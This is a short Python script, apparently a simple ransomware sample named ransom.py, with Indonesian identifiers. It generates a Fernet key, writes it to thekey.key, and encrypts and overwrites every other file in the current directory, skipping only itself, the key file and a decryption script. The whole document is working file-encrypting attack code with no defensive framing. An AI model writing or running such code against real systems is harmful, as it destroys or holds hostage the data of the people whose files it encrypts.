import os
from cryptography.fernet import Fernet

data_file = []

for file in os.listdir() :
	if file == "ransom.py" or file == "thekey.key" or file == "dekripsi.py":
		continue
	

	if os.path.isfile(file) :
		data_file.append(file)	
	

kunci = Fernet.generate_key()

with open("thekey.key", "wb") as kuncifile :
	kuncifile.write(kunci)

for data in data_file :
	with open(data, "rb") as thefile:
		isi = thefile.read()
	isi_enkripsi = Fernet(kunci).encrypt(isi)
	
	with open(data, "wb") as thefile :
		thefile.write(isi_enkripsi)


